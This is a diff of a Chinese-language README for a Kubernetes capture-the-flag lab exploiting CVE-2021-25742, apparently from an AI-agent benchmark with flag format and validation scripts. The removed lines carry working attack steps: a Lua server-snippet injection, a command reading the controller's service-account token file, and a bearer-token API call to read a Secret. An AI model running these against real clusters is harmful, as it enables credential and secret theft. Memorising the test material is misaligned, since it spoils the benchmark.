@@ -7,20 +7,16 @@
 | ID | K8S-21 |
 | 名称 | ingress-nginx Lua Snippet Secret Extraction |
 | 技术/CVE | CVE-2021-25742 |
-| 难度 | L2 |
+| 难度 | L3 |
 | 交付方式 | KIND / Kubernetes |
 | 入口 | localhost:10480 |
-| 集群 | cve-k8s-21-ingress-snippet |
-| 镜像 | kindest/node:v1.27.3 |
-| 攻击面 | Ingress annotation injection → SA token theft → Secret access |
+| 入口身份 | sa-token default/ingress-writer（只给 Ingress 写权限） |
+| 终点 | Secret flag-secret（default，用控制器 SA token 读取） |
 
 ## 场景概述
 
-```
-kubectl access → Modify Ingress server-snippet annotation
-  → Inject Lua code to read SA token from filesystem
-  → Use SA token to call K8s API → Read flag-secret
-```
+入口身份只有 `default` 命名空间里 Ingress 的写权限。改写 `snippet-app` 的 server-snippet，
+让 nginx 的 Lua 片段去读控制器的 SA token；拿到 token 后再用它以控制器身份读 flag Secret。
 
 ## 前置知识
 
@@ -29,57 +25,25 @@ kubectl access → Modify Ingress server-snippet annotation
 
 ## 利用步骤
 
-### Step 1: Identify Vulnerable Ingress
-
-```bash
-kubectl get ingress snippet-app -o yaml
-# Note the server-snippet annotation is enabled
-```
-
-### Step 2: Modify Ingress with Malicious Snippet
-
-```bash
-kubectl annotate ingress snippet-app \
-  nginx.ingress.kubernetes.io/server-snippet='
-  local sock = ngx.socket.tcp()
-  sock:connect("127.0.0.1", 80)
-  local req = "GET /secret HTTP/1.1\r\nHost: localhost\r\n\r\n"
-  sock:send(req)
-  local resp = sock:receive("*a")
-  ngx.log(ngx.ERR, "SECRET_RESP: " .. resp)
-  '
-```
-
-### Step 3: Trigger Request and Extract Token
-
-```bash
-curl -H "Host: demo.local" http://localhost:10480/
-# Check ingress-nginx controller logs for the SA token
-kubectl logs -n ingress-nginx deployment/ingress-nginx-controller | grep ERROR
-```
-
-### Step 4: Use Token to Read Flag Secret
-
-```bash
-TOKEN=$(kubectl exec -n ingress-nginx <controller-pod> -- \
-  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-curl -k -H "Authorization: Bearer $TOKEN" \
-  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/flag-secret
-# Base64 decode the flag from the response
-```
+1. 用 `default` 命名空间的 Ingress 写权限改写 `snippet-app` 的 server-snippet。
+2. 让 nginx 的 Lua 片段读出控制器的 SA token（例如把 token 送进可读位置）。
+3. 用该 token 以控制器身份读 `default/flag-secret`，拿到 flag。
 
 ## 验证命令
 
 ```bash
-cd cve_challenges/scenarios/k8s/ingress-snippet && bash deploy.sh
-kubectl get secret flag-secret -o jsonpath='{.data.flag}' | base64 -d
-bash teardown.sh
+kubectl get pod -l app=snippet-app -n default
+bash tests/k8s/run.sh k8s-21 <agent-kubeconfig> <expected-flag> <cluster-name>
 ```
 
 ## Flag
 
-- **Primary**: Kubernetes Secret `flag-secret` in `default` namespace
-- **Format**: `flag{k8s-21-<16-hex>}`
+- 位置：Secret flag-secret（default，用控制器 SA token 读取）。
+- 注入：验收侧用 `CVE_FLAG` 显式传入（多 flag 场景用 `CVE_FLAG1..N`），部署时写进节点
+  （root-only 0600）或集群内 Secret/ConfigMap，宿主不留副本。
+- 形态：`flag{k8s-21-<16 位十六进制>}`。
+- 验收：`bash scripts/validate-k8s-gate.sh k8s-21 <agent-kubeconfig> <flag> <cluster>`（gate）+
+  `bash tests/k8s/run.sh k8s-21 <agent-kubeconfig> <flag> <cluster>`（参考利用）。
 
 ## 此场景利用了哪些知识
 
